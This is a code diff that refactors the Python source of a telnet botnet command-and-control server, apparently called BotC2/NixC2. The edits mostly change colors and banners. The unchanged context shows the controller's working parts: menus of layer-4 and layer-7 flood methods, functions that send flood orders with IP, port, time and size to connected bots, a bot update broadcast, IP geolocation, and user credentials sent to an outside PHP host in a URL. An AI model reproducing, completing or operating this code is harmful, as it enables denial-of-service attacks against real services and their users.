@@ -10,285 +10,52 @@ data = ""
 otp_code = ''
 num = 0
 send_attack_target = 0
-
-def color2(data_input_output):
-    random_output = data_input_output
-
-    if random_output == "GREEN":
-        data = '\033[32m'
-    elif random_output == "LIGHTGREEN_EX":
-        data = '\033[92m'
-    elif random_output == "YELLOW":
-        data = '\033[33m'
-    elif random_output == "LIGHTYELLOW_EX":
-        data = '\033[93m'
-    elif random_output == "CYAN":
-        data = '\033[36m'
-    elif random_output == "LIGHTCYAN_EX":
-        data = '\033[96m'
-    elif random_output == "BLUE":
-        data = '\033[34m'
-    elif random_output == "LIGHTBLUE_EX":
-        data = '\033[94m'
-    elif random_output == "MAGENTA":
-        data = '\033[35m'
-    elif random_output == "LIGHTMAGENTA_EX":
-        data = '\033[95m'
-    elif random_output == "RED":
-        data = '\033[31m'
-    elif random_output == "LIGHTRED_EX":
-        data = '\033[91m'
-    elif random_output == "BLACK":
-        data = '\033[30m'
-    elif random_output == "LIGHTBLACK_EX":
-        data = '\033[90m'
-    elif random_output == "WHITE":
-        data = '\033[37m'
-    elif random_output == "LIGHTWHITE_EX":
-        data = '\033[97m'
-    return data
-
-def color():
-
-    random2 = ["GREEN","YELLOW","CYAN","BLUE","MAGENTA","RED","BLACK","WHITE","LIGHTGREEN_EX","LIGHTYELLOW_EX","LIGHTCYAN_EX","LIGHTBLUE_EX","LIGHTMAGENTA_EX","LIGHTRED_EX","LIGHTBLACK_EX","LIGHTWHITE_EX"]
-    
-    random2.remove('BLACK')
-    random2.remove('LIGHTBLACK_EX')
-
-    random = choice((random2))
-
-    if random == "GREEN":
-        data = '\033[32m'
-    elif random == "LIGHTGREEN_EX":
-        data = '\033[92m'
-    elif random == "YELLOW":
-        data = '\033[33m'
-    elif random == "LIGHTYELLOW_EX":
-        data = '\033[93m'
-    elif random == "CYAN":
-        data = '\033[36m'
-    elif random == "LIGHTCYAN_EX":
-        data = '\033[96m'
-    elif random == "BLUE":
-        data = '\033[34m'
-    elif random == "LIGHTBLUE_EX":
-        data = '\033[94m'
-    elif random == "MAGENTA":
-        data = '\033[35m'
-    elif random == "LIGHTMAGENTA_EX":
-        data = '\033[95m'
-    elif random == "RED":
-        data = '\033[31m'
-    elif random == "LIGHTRED_EX":
-        data = '\033[91m'
-    elif random == "BLACK":
-        data = '\033[30m'
-    elif random == "LIGHTBLACK_EX":
-        data = '\033[90m'
-    elif random == "WHITE":
-        data = '\033[37m'
-    elif random == "LIGHTWHITE_EX":
-        data = '\033[97m'
-    return data
 user_name = ""
 bots = {}
 
 # Banners
 
-banner_2 = f"""
-          ╔╗ ╔═╗╔╦╗ ╔═╗ ╔═╗ 
-          ╠╩╗║ ║ ║  ║   ╔═╝ 
-          ╚═╝╚═╝ ╩  ╚═╝ ╚═╝  
-╔══════════════════════════════════════╗
-  credit - NixWasHere/NixC2 OWNER code
-╔══════════════════════════════════════╗
-║ ─ ─ ─ Type HELP To Get Command ─ ─ ─ ║
-╚══════════════════════════════════════╝"""
-
-banner = f"""
- ╔╗ ╔═╗╔╦╗ ╔═╗ ╔═╗ 
- ╠╩╗║ ║ ║  ║   ╔═╝ 
- ╚═╝╚═╝ ╩  ╚═╝ ╚═╝
-"""
-
-l_banner = f"""
- ╔╗ ╔═╗╔╦╗ ╔═╗ ╔═╗ 
- ╠╩╗║ ║ ║  ║   ╔═╝ 
- ╚═╝╚═╝ ╩  ╚═╝ ╚═╝ 
-credit: NixWasHere/NixC2 OWNER code
-#═════════════════════════#
-  ─ ─ ─ LOGIN USER ─ ─ ─
-#═════════════════════════#
-"""
+banner_2 = f"""          ╔╗ ╔═╗╔╦╗ ╔═╗ ╔═╗ \n          ╠╩╗║ ║ ║  ║   ╔═╝ \n          ╚═╝╚═╝ ╩  ╚═╝ ╚═╝  \n╔══════════════════════════════════════╗\n  credit - NixWasHere/NixC2 OWNER code\n╔══════════════════════════════════════╗\n║ ─ ─ ─ Type HELP To Get Command ─ ─ ─ ║\n╚══════════════════════════════════════╝"""
+banner = f""" ╔╗ ╔═╗╔╦╗ ╔═╗ ╔═╗ \n ╠╩╗║ ║ ║  ║   ╔═╝ \n ╚═╝╚═╝ ╩  ╚═╝ ╚═╝"""
+l_banner = f""" ╔╗ ╔═╗╔╦╗ ╔═╗ ╔═╗ \n ╠╩╗║ ║ ║  ║   ╔═╝ \n ╚═╝╚═╝ ╩  ╚═╝ ╚═╝ \ncredit: NixWasHere/NixC2 OWNER code\n#═════════════════════════#\n  ─ ─ ─ LOGIN USER ─ ─ ─\n#═════════════════════════#"""
 
 HINT_PASSWORD = ''
 
 def get_location(ip_addr,GET_DATA):
-    ip_address = ip_addr
-    response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()
-    network = response.get("network")
-    version = response.get("version")
-    org = response.get("org")
-    country_tld = response.get("country_tld")
+    response = requests.get(f'https://ipapi.co/{ip_addr}/json/').json()
+    network = f'#IP DATA\nIP            : {ip_addr}\nNETWORK       : {response.get("network")}\nVERSION       : {response.get("version")}\nORG           : {response.get("org")}\nCOUNTRY_TLD   : {response.get("country_tld")}'
+    location = f'# LOCATION\nCITY          : {response.get("city")}\nREGION        : {response.get("region")}\nCOUNTRY_NAME  : {response.get("country_name")}\nLATITUDE      : {response.get("latitude")}\nLONGITUDE     : {response.get("longitude")}'
+    times = f'# TIME\nTIME-ZONE     : {response.get("timezone")}\nUTC_OFFSET    : {response.get("utc_offset")}'
+    other_data = f'# OTHER DATA\nCALLING_CODE    : {response.get("country_calling_code")}\nLANGUAGES     : {response.get("languages")}\nCURRENCY_NAME : {response.get("currency_name")}\nCURRENCY      : {response.get("currency")}'
 
-    city = response.get("city")
-    region_city = response.get("region")
-    country_name = response.get("country_name")
-    latitude = response.get("latitude")
-    longitude = response.get("longitude")
-
-    timezone = response.get("timezone")
-    utc_offset = response.get("utc_offset")
-
-    calling_code = response.get("country_calling_code")
-    network = response.get("network")
-    languages = response.get("languages")
-    currency_name = response.get("currency_name")
-    currency = response.get("currency")
-
-    if GET_DATA == "IP_DATA":
-        location_data = f'''
-# IP DATA
-IP            : {ip_address}
-NETWORK       : {network}
-VERSION       : {version}
-ORG           : {org}
-COUNTRY_TLD   : {country_tld}'''
-    elif GET_DATA == "LOCATION":
-        location_data = f'''
-# LOCATION
-CITY          : {city}
-REGION        : {region_city}
-COUNTRY       : {country_name}
-LATITUDE      : {latitude}
-LONGITUDE     : {longitude}'''
-    elif GET_DATA == "TIME":
-        location_data = f'''
-# TIME
-TIMEZONE      : {timezone}
-UTC_OFFSET    : {utc_offset}'''
-    elif GET_DATA == "OTHER_DATA":
-        location_data = f'''
-# OTHER DATA
-CALLING_CODE  : {calling_code}
-LANGUAGES     : {languages}
-CURRYENCY     : {currency}
-CURRENCY_NAME : {currency_name}'''
-    elif GET_DATA == "ALL_DATA":
-        location_data = f'''
-# IP DATA
-IP            : {ip_address}
-NETWORK       : {network}
-VERSION       : {version}
-ORG           : {org}
-COUNTRY_TLD   : {country_tld}
-
-# LOCATION
-CITY          : {city}
-REGION        : {region_city}
-COUNTRY       : {country_name}
-LATITUDE      : {latitude}
-LONGITUDE     : {longitude}
-
-# TIME
-TIMEZONE      : {timezone}
-UTC_OFFSET    : {utc_offset}
-
-# OTHER DATA
-CALLING_CODE  : {calling_code}
-LANGUAGES     : {languages}
-CURRYENCY     : {currency}
-CURRENCY_NAME : {currency_name}'''
+    if GET_DATA == "IP_DATA":location_data = network
+    elif GET_DATA == "LOCATION":location_data = location
+    elif GET_DATA == "TIME":location_data = times
+    elif GET_DATA == "OTHER_DATA":location_data = other_data
+    elif GET_DATA == "ALL_DATA":location_data = network+'\n\n'+location+'\n\n'+times+'\n\n'+other_data
     return location_data
 
 def loadering(client):
     send(client, f'\33]0;\a', False)
     send(client, ansi_clear, False)
     global user_name
-    data = ""
-    for number in range(int(randint(1,3))):
-
-        color_random = color()
-
-        send(client, f'''{color_random}█▒▒▒▒▒▒▒▒▒ L _ ⏳''')
-        send(client, f'\33]0;L _ ⌛ | BOT {len(bots)}\a', False)
-        time.sleep(0.2)
-        send(client, ansi_clear, False)
-
-        send(client, f'''{color_random}██▒▒▒▒▒▒▒▒ LO _ ⌛''')
-        send(client, f'\33]0;LO _ ⏳ | BOT {len(bots)}\a', False)
-        time.sleep(0.2)
-        send(client, ansi_clear, False)
-
-        send(client, f'''{color_random}███▒▒▒▒▒▒▒ LOA _ ⏳''')
-        send(client, f'\33]0;LOA _ ⌛ | BOT {len(bots)}\a', False)
-        time.sleep(0.2)
-        send(client, ansi_clear, False)
-
-        send(client, f'''{color_random}█████▒▒▒▒▒ LOAD _ ⌛''')
-        send(client, f'\33]0;LOAD _ ⏳ | BOT {len(bots)}\a', False)
-        time.sleep(0.2)
-        send(client, ansi_clear, False)
-
-        send(client, f'''{color_random}███████▒▒▒ LOADI _ ⏳''')
-        send(client, f'\33]0;LOADI _ ⌛ | BOT {len(bots)}\a', False)
-        time.sleep(0.2)
-        send(client, ansi_clear, False)
-
-        send(client, f'''{color_random}█████████▒ LOADIN _ ⌛''')
-        send(client, f'\33]0;LOADIN _ ⏳ | BOT {len(bots)}\a', False)
-        time.sleep(0.2)
-        send(client, ansi_clear, False)
-
-        send(client, f'''{color_random}██████████ LOADING _ ⏳''')
-        send(client, f'\33]0;LOADING _ ⌛ | BOT {len(bots)}\a', False)
-        time.sleep(0.2)
-        send(client, ansi_clear, False)
-        data = ""
+    loading = ['\\','|','/','-']
+    for _ in range(int(randint(1,3))):
+        color_random = f'\x1b[38;5;{randint(0,255)}m'
+        for i in loading:
+         send(client, f'''{color_random}Loading {i}''')
+         send(client, f'\33]0;L _ ⌛ | BOT {len(bots)}\a', False)
+         time.sleep(0.2)
+         send(client, ansi_clear, False)
     threading.Thread(target=update_title, args=(client,user_name)).start()
 TIITLE_MESSAGE = ''
 DATA_TEXT = ''
 
-message_test = f"""
-╔═══════════════════════ [{TIITLE_MESSAGE}]
-{DATA_TEXT}
-╚════════════════════════"""
+message_test = f"""╔═══════════════════════ [{TIITLE_MESSAGE}]\n{DATA_TEXT}\n╚════════════════════════"""
+help = f"""    </>─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─</>\n    ╔═════════════════════════════════════════╗\n    ║ SQL_USER     ADDED NEW USER\n    ║  OTP_SENT    2FA FOR ADD USER\n    ║ METHODS      Shows list of attack methods all\n    ║ PING_URL     Test requests to url with get methods [pls read how to use]\n    ║ UPDATE_UA    Install patch update ua (pip)\n    ║ URL_TO_IP    url to ip\n    ║ IP_GEO       IP GEOLOCATION\n    ║ SET_PROMPT   SET PROMPT TEXT INPUT\n    ║ CLEAR        Clears the screen \n    ║ LOGOUT,EXIT  Disconnects from the cnc\n    ╚═════════════════════════════════════════╝\n    </></></></></></></></></></></></></></></>"""
+layer4 = f"""    ╔═════════════════════════════════════════\n    ║   ─ ─ ─ ─ ─ ─ Methods L4 ─ ─ ─ ─ ─ ─\n    ║═════════════════════════════════════════\n    ║  .udp .tcp .tup .udp_open # UDP/TCP\n    ║  .rand_std .rand_hex .rand_vse .rand_all # RAND\n    ║  .syn # CONNECT\n    ╚═════════════════════════════════════════"""
 
-help = f"""
-    </>─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─</>
-    ╔═════════════════════════════════════════╗
-    ║ SQL_USER     ADDED NEW USER
-    ║  OTP_SENT    2FA FOR ADD USER
-    ║ METHODS      Shows list of attack methods all
-    ║ PING_URL     Test requests to url with get methods [pls read how to use]
-    ║ UPDATE_UA    Install patch update ua (pip)
-    ║ URL_TO_IP    url to ip
-    ║ IP_GEO       IP GEOLOCATION
-    ║ SET_PROMPT   SET PROMPT TEXT INPUT
-    ║ CLEAR        Clears the screen 
-    ║ LOGOUT,EXIT  Disconnects from the cnc
-    ╚═════════════════════════════════════════╝
-    </></></></></></></></></></></></></></></>
-"""
-
-layer4 = f"""
-    ╔═════════════════════════════════════════
-    ║   ─ ─ ─ ─ ─ ─ Methods L4 ─ ─ ─ ─ ─ ─
-    ║═════════════════════════════════════════
-    ║  .udp .tcp .tup .udp_open # UDP/TCP
-    ║  .rand_std .rand_hex .rand_vse .rand_all # RAND
-    ║  .syn # CONNECT
-    ╚═════════════════════════════════════════
-"""
-
-layer7 = f"""
-    ╔═════════════════════════════════════════
-    ║    ─ ─ ─ ─ ─ ─ Methods L7 ─ ─ ─ ─ ─ ─
-    ║═════════════════════════════════════════
-    ║  .http .cfb_sock .pyf .tls_small # HTTP SOCKETS
-    ║  .http_req .http_cfb .http_dfb .http_all # HTTP REQUESTS
-    ╚═════════════════════════════════════════
-"""
+layer7 = f"""    ╔═════════════════════════════════════════\n    ║    ─ ─ ─ ─ ─ ─ Methods L7 ─ ─ ─ ─ ─ ─\n    ║═════════════════════════════════════════\n    ║  .http .cfb_sock .pyf .tls_small # HTTP SOCKETS\n    ║  .http_req .http_cfb .http_dfb .http_all # HTTP REQUESTS\n    ╚═════════════════════════════════════════"""
 ansi_clear = '\033[2J\033[H'
 
 # Validate IP
@@ -346,8 +113,7 @@ def find_login(client,username, password,username_sql):
                 req = b'ROOT:ROOT\nADMIN:ADMIN\nGUEST:GUEST\nIDK:IDK'
                 break
             else:
-                color_random = color()
-                send(client, f'''{color_random}WAITING TO GET MYSQL . . .''')
+                send(client, f'''\x1b[38;5;{randint(0,255)}mWAITING TO GET MYSQL . . .''')
                 send(client, f"\33]0;C&C CAN'T GET MYSQL {count_get_mysql_user_pass}\a", False)
                 print("TRYING . . .")
                 rps += 1
@@ -384,7 +150,7 @@ def handle_client(client, address):
     global num
     send(client, f'\x1b[3;31;40mBotC2 | Login: Awaiting Response...\a', False)
     send(client, ansi_clear, False)
-    color_random = color()
+    color_random = f'\x1b[38;5;{randint(0,255)}m'
     send(client, f'{Fore.LIGHTBLUE_EX}Connection {Fore.LIGHTGREEN_EX}PUTTY {Fore.LIGHTBLUE_EX} To {Fore.LIGHTYELLOW_EX}BotC2 Servers {Fore.LIGHTMAGENTA_EX}(OK!)')
     for x in l_banner.split('\n'):
         send(client,f'{color_random}'+x)
@@ -470,7 +236,7 @@ def update_title(client,name):
     except:
         client.close()
 
-color_random = color()
+color_random = f'\x1b[38;5;{randint(0,255)}m'
 
 # Telnet Command Line
 def command_line(client):
@@ -480,7 +246,7 @@ def command_line(client):
     global TIITLE_MESSAGE
     global message_test
     loadering(client)
-    color_random = color()
+    color_random = f'\x1b[38;5;{randint(0,255)}m'
     for x in banner_2.split('\n'):
         send(client,f'{color_random}'+x)
         time.sleep(0.2)
@@ -499,25 +265,25 @@ def command_line(client):
             args = data.split(' ')
             command = args[0].upper()
 
-            color_random = color()
+            color_random = f'\x1b[38;5;{randint(0,255)}m'
             if command == 'HELP':
                 loadering(client)
-                color_random = color()
+                color_random = f'\x1b[38;5;{randint(0,255)}m'
                 for x in banner.split('\n'):
                     send(client,f'{color_random}'+x)
                     time.sleep(0.2)
                 data = ""
                 if len(args) == 2:
                     data = args[1]
-                    color_random = color()
+                    color_random = f'\x1b[38;5;{randint(0,255)}m'
                     if "ALL_TOOL" in data:
                         for x in help.split('\n'):
                             send(client,f'{color_random}'+x)
                 else:
-                    color_random = color()
+                    color_random = f'\x1b[38;5;{randint(0,255)}m'
                     for x in help.split('\n'):
                             send(client,f'{color_random}'+x)
-                    color_random = color()
+                    color_random = f'\x1b[38;5;{randint(0,255)}m'
                     send(client,f'{color_random}YOU CAN USE THIS COMMAND -->')
                     send(client,f'{color_random}HELP [MODE]')
                     send(client,f'{color_random}[MODE] --> ALL_TOOL')
@@ -569,11 +335,11 @@ def command_line(client):
                                 LINK_DB_LOAD = f'https://nixwashere.000webhostapp.com/php_mysql.php?SQL_USER={user_name_get}:{password_get}'
                             req = requests.get(url=LINK_DB_LOAD)
                             loadering(client)
-                            color_random = color()
+                            color_random = f'\x1b[38;5;{randint(0,255)}m'
                             for x in banner.split('\n'):
                                 send(client,f'{color_random}'+x)
                                 time.sleep(0.2)
-                            color_random = color()
+                            color_random = f'\x1b[38;5;{randint(0,255)}m'
                             TIITLE_MESSAGE = 'UPLOAD USERNAME/PASSWORD TO MYSQL'
                             DATA_TEXT = f'  USER-{user_name_get} PASS-{password_get} STATUS-{req.status_code}'
                             message_test = f"""
@@ -629,12 +395,12 @@ def command_line(client):
                         host = str(url).replace("https://", "").replace("http://", "").replace("www.", "")
                         ip = socket.gethostbyname(host)
                         loadering(client)
-                        color_random = color()
+                        color_random = f'\x1b[38;5;{randint(0,255)}m'
                         for x in banner.split('\n'):
                             send(client,f'{color_random}'+x)
                             time.sleep(0.2)
                         
-                        color_random = color()
+                        color_random = f'\x1b[38;5;{randint(0,255)}m'
                         TIITLE_MESSAGE = 'URL TO IP'
                         DATA_TEXT = f' URL {url} --> IP {ip}'
                         message_test = f"""
@@ -657,12 +423,12 @@ def command_line(client):
                         data_get_location = str(args[2])
                         ip_location = get_location(ip,data_get_location)
                         loadering(client)
-                        color_random = color()
+                        color_random = f'\x1b[38;5;{randint(0,255)}m'
                         for x in banner.split('\n'):
                             send(client,f'{color_random}'+x)
                             time.sleep(0.2)
                         
-                        color_random = color()
+                        color_random = f'\x1b[38;5;{randint(0,255)}m'
                         TIITLE_MESSAGE = 'IP TO LOCATION'
                         DATA_TEXT = f'{ip_location}'
                         message_test = f"""
@@ -682,11 +448,11 @@ def command_line(client):
                 if len(args) == 2:
                     layer_get = args[1]
                     if "LAYER4" in layer_get or "L4" in layer_get or "4" in layer_get:
-                        color_random = color()
+                        color_random = f'\x1b[38;5;{randint(0,255)}m'
                         for x in layer4.split('\n'):
                             send(client,f'{color_random}'+x)
                     elif "LAYER7" in layer_get or "L7" in layer_get or "7" in layer_get:
-                        color_random = color()
+                        color_random = f'\x1b[38;5;{randint(0,255)}m'
                         for x in layer7.split('\n'):
                             send(client,f'{color_random}'+x)
                 else:
@@ -705,14 +471,14 @@ def command_line(client):
             elif command == 'CLEAR' or command== "CLS":
                 loadering(client)
                 send(client, ansi_clear, False)
-                color_random = color()
+                color_random = f'\x1b[38;5;{randint(0,255)}m'
                 for x in banner_2.split('\n'):
                     send(client, f'{color_random}'+x)
                     time.sleep(0.2)
                 send(client, f"{Fore.GREEN}WELCOME TO BOTNET.CNC -> USER-{user_name} BOTNET-{len(bots)} 📡")
                 send(client, f"{Fore.YELLOW} credit: NixWasHere/NixC2 OWNER code")
             elif command == 'LOGOUT' or command == "EXIT":
-                color_random = color()
+                color_random = f'\x1b[38;5;{randint(0,255)}m'
                 for x in banner.split('\n'):
                     send(client,f'{color_random}'+x)
                     time.sleep(0.2)
@@ -721,7 +487,7 @@ def command_line(client):
                 break
             elif command == "UPDATE_UA":
                 broadcast(data)
-                color_random = color()
+                color_random = f'\x1b[38;5;{randint(0,255)}m'
                 send(client,f'{color_random}SENT UPDATE TO BOT . . .')
             elif command == '.UDP':  # UDP Junk (Random UDP Data)
                 all_layer4(args,command, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear,attack_sent2, broadcast, data)
@@ -777,22 +543,13 @@ screenedSuccessfully = """
 def attack_sent1(ip, port, secs, client):
     global send_attack_target
     loadering(client)
-    color_random = color()
+    color_random = f'\x1b[38;5;{randint(0,255)}m'
     send(client, f"")
     for x in banner.split('\n'):
         send(client,f'{color_random}'+x)
         time.sleep(0.2)
-    message_flooding = f"""
-╔═════════════════════════════ > _
-       ! SEND ATTACKING !
-   ═════════════════════════
-       IP {ip}
-     PORT {port}
-     TIME {secs}
-   ═════════════════════════
-    </> </> </> </> </> </>
-╚═════════════════════════════[ {len(bots)} botnet ] >_"""
-    color_random = color()
+    message_flooding = f"""╔═════════════════════════════ > _\n       ! SEND ATTACKING !\n   ═════════════════════════\n       IP {ip}\n     PORT {port}\n     TIME {secs}\n   ═════════════════════════\n    </> </> </> </> </> </>\n╚═════════════════════════════[ {len(bots)} botnet ] >_"""
+    color_random = f'\x1b[38;5;{randint(0,255)}m'
     for x in message_flooding.split('\n'):
         send(client,f'{color_random}'+x)
         time.sleep(0.2)
@@ -802,22 +559,12 @@ def attack_sent1(ip, port, secs, client):
 def attack_sent2(ip, port, secs, size, client):
     global send_attack_target
     loadering(client)
-    color_random = color()
+    color_random = f'\x1b[38;5;{randint(0,255)}m'
     send(client, f"")
     for x in banner.split('\n'):
         send(client,f'{color_random}'+x)
         time.sleep(0.2)
-    message_flooding = f"""
-╔══════════════════════════[ATTACKING SENDING] >_
-    >_ SEND TO BOTNET >_
-  ════════════════════════
-    IP > {ip}
-  PORT > {port}
-  TIME > {secs}
-  SIZE > {size}
-  ════════════════════════
-   </> </> </> </> </> </>
-╚══════════════════════════[{len(bots)} botnet] >_"""
+    message_flooding = f"""╔══════════════════════════[ATTACKING SENDING] >_\n    >_ SEND TO BOTNET >_\n  ════════════════════════\n    IP > {ip}\n  PORT > {port}\n  TIME > {secs}\n  SIZE > {size}\n  ════════════════════════\n   </> </> </> </> </> </>\n╚══════════════════════════[{len(bots)} botnet] >_"""
 
     for x in message_flooding.split('\n'):
         send(client,f'{color_random}'+x)
